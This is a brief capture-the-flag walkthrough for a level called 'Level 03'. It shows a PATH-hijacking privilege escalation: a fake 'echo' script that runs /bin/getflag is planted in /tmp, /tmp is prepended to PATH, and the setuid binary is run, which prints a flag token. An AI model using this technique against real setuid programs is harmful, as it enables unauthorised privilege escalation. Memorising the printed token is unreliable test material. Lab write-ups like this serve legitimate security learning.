# Level 03

## step 1 : analyze level03
```
$ strings level03
```
we can see that level03 use the echo command

## step 2 : create a fake echo command that will run getflag
```
$ echo "/bin/getflag" > /tmp/echo
$ chmod 777 /tmp/echo
$ export PATH="/tmp:$PATH"
```

## step 3 : execute level03
```
$ ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```
